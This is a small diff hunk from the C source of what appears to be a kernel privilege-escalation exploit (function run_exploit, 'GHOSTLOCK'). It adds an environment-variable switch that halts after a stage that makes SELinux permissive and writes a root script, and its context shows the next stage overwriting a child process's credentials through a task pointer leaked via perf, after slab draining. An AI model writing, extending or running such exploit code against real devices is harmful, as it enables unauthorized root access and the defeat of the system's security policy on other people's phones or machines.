@@ -1027,6 +1027,15 @@ int run_exploit(int argc, char **argv) {
     pr_success("SELinux already permissive\n");
   }
 
+
+  /* W1-only mode: stop after disabling SELinux; the caller (app) performs
+   * the rest (e.g. a vendor-specific service call) outside this binary. */
+  if (getenv("GHOSTLOCK_W1_ONLY")) {
+    write_root_script();
+    pr_success("W1 done in W1-only mode; SELinux permissive. Stopping.\n");
+    return 0;
+  }
+
   /* W2: overwrite the child credential via the task leaked by perf. */
   slab_drain();
   TIMER("pre-W2 drain");
